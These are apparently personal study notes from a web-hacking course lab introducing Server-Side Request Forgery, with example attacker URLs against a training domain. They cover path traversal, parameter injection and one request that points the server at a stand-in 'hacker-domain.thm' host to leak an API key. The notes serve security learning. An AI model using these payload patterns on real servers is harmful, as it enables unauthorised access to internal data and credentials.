---
layout: default
title: Intro to SSRF
parent: Introduction to Web Hacking
nav_order: 7
---

# Intro to SSRF
**Server-Side Request Forgery (SSRF)**
Allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.
- **Regular SSRF**, Where data is returned to the attacker's screen.
- **Blind SSRF**, Where an SSRF occurs, but no information is returned to the attacker's screen.

**A successful SSRF attack**
- Access to unauthorised areas
- Access to customer/organisational data
- Ability to scale to internal networks
- Reveal authentication tokens/credentials

## SSRF Examples
**Expected Request**

`http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123`
1. Attacker requests
    - `http:/website.thm/stock?url=http://api.website.thm/api/user`
1. Website requests
    - `http://api.website.thm/api/user`
1. Website returns
    - User data to attacker.
1. API server
    - Returns user data to the website instead of stock information.

`http://website.thm/stock?url=item?id=123`
1. Attacker requests
    - `http://website.thm/stock?url=/../user`
1. Website requests
    - `http://api.website.thm/api/stock/../user`
1. Website returns
    - User data to attacker.
1. API server
    - Returns user data to the website instead of stock information.

`http://website.thm/stock?server=api&id=123`
1. Attacker requests
    - `http://website.thm/stock?server=api.website.thm/api/user&x=&id=123`
1. Website requests
    - `http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123`
1. Website returns
    - User data to attacker.
1. API server
    - Returns user data to the website instead of stock information.

`http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123`
1. Attacker requests
    - `http://website.thm/stock?url=http://hacker-domain.thm/`
1. Website requests
    - Skip, ...
1. Website requests
    - Data from hacker-domain.thm instead of api.website.thm revealing the API key
1. API server
    - Skip, ...

Q

1. `https://website.thm/item/2?server=server.website.thm/flag?id=9&x=`
1. `Server Requesting: https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2`

## Finding an SSRF
1. When a full URL is used in a parameter in the address bar
    - `https://website.thm/form?server=http://server.website.thm/store`
1. A hidden field in a form
    - `value="http://server.website.thm.store"`
1. A partial URL such as just the hostname
    - `https://website.thm/form?server=api`
1. Only the path of the URL
    - `https://website.thm/form?dst=/forms/contact`

`https://website.thm/fetch-file.php?fname=242533.pdf&srv=filestorage.cloud.thm&port=8001`

## Defeating Common SSRF
- **Deny List**
- **Allow List**
- **Open Redirect**

## Pra
- `/private`
- `customers/new-account-page`
![customers/new-account-page](imgs/customers-new-account-page.png)
![customers/new-account-page](imgs/customers-new-account-page-select.png)
![customers/new-account-page](imgs/customers-new-account-page-private.png)
![customers/new-account-page](imgs/customers-new-account-page-deny.png)
![customers/new-account-page](imgs/customers-new-account-page-private-new.png)